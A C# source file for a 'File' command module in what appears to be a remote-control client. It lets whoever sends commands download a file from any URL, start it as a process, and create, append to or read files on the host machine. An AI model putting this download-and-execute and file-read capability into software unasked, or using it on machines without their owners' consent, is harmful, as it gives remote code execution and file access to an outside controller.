using System;
using System.Diagnostics;
using System.Linq;
using System.Net;

namespace Client.Commands
{
    class File : Command
    {
        public File(string name) : base(name) { }

        public override string execute(string[] args)
        {
            if (args.Length == 0) return "Expected argument for file";
            try
            {
                switch (args.First())
                {

                    case "run":
                        if (args.Length != 2) return "Expected 2 arguments for file run";
                        return this.runFile(args[1]);
                        break;

                    case "download":
                        if (args.Length != 3) return "Expected 3 arguments for file download";
                        return this.download(args[1], args[2]);
                        break;

                    case "create":
                        if (args.Length != 2) return "Expected 2 arguments for file create";
                        return this.create(args[1]);
                        break;

                    case "write":
                        if (args.Length != 3) return "Expected 3 arguments for file write";
                        return this.write(args[1], args[2]);
                        break;

                    case "read":
                        if (args.Length != 2) return "Expected 2 arguments for file read";
                        return this.view(args[1]);
                        break;

                    default:
                        return "Unexpected argument " + args[0];
                }
            }
            catch (Exception e)
            {
                return e.Message;
            }
        }

        public string runFile(string fn) { return "Started Process With ID: " + Process.Start(fn).Id; }

        public string download(string url, string fn)
        {
            using (WebClient wc = new WebClient())
                wc.DownloadFile(url, fn);
            return "Downloaded File: " + fn;
        }

        public string create(string fn)
        {
            System.IO.File.Create(fn).Close();
            return "File Created: " + fn;
        }

        public string write(string fn, string data)
        {
            System.IO.File.AppendAllText(fn, data);
            return "Appended Text To File: " + fn;
        }

        public string view(string fn) { return System.IO.File.ReadAllText(fn); }
    }
}
